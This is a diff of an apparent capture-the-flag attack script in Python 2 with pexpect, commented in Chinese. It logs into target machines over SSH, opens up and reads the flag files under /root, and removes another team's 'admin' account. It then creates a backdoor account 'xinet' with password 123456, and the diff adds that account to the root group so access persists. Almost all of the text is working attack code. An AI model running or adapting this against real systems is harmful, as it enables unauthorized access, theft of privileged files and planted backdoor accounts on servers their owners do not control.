@@ -29,8 +29,8 @@ with open(path, 'wb') as f:
     child.logfile = f
 
     res = child.expect([
-        'Are you sure you want to continue connecting (yes/no)?', 'password:', 'Connection refused'
-        , pexpect.TIMEOUT, pexpect.EOF], timeout=5)
+        'Are you sure you want to continue connecting (yes/no)?', 'password:'
+        , 'No route to host', pexpect.TIMEOUT], timeout=5)
 
     if res == 0:
         child.sendline('yes')
@@ -40,7 +40,7 @@ with open(path, 'wb') as f:
         exit(0)
 
     child.sendline(password)
-    res = child.expect(['[#$]', 'Permission denied', pexpect.TIMEOUT, pexpect.EOF], timeout=10)
+    res = child.expect(['[#$]', 'Permission denied', pexpect.TIMEOUT, pexpect.EOF], timeout=5)
     if res == 1:
         print 'Permission denied'
         exit(0)
@@ -48,15 +48,15 @@ with open(path, 'wb') as f:
         print 'Connect Time out'
         exit(0)
 
-    # 修改文件的权限,当然得是ROOT用户才有效
-    child.sendline('chmod 777 /root/flag*')
-    child.expect([r'\[.*\][$#]'])
-
-    # 获取Flag值,为什么这么麻烦..
-    child.sendline('cat /root/flag*')
+    # 获取Flag值
+    child.sendline('chmod 777 /root/flag* 2>/dev/null;cat /root/flag*')
     child.expect(r'\[.*\][$#]')
     flag = child.before.split('\n')[1].replace('\n', '')
     print '[Flag] %s - %s' % (target, flag)
+
+    # 不推荐,提交后需要等待10秒才能再次提交,还不如手动提交
+    # import auto_flag
+    # auto_flag.commit_flag(target,flag)
 
     # 帮他删除后门账号
     child.sendline('/usr/sbin/userdel -f admin')
@@ -74,6 +74,7 @@ with open(path, 'wb') as f:
 
     # 为后面的刷分做准备
     child.sendline('/usr/sbin/useradd xinet')
+    child.sendline('/usr/sbin/usermod -g root xinet')
     child.sendline('passwd xinet')
     child.sendline('123456')
     child.sendline('123456')
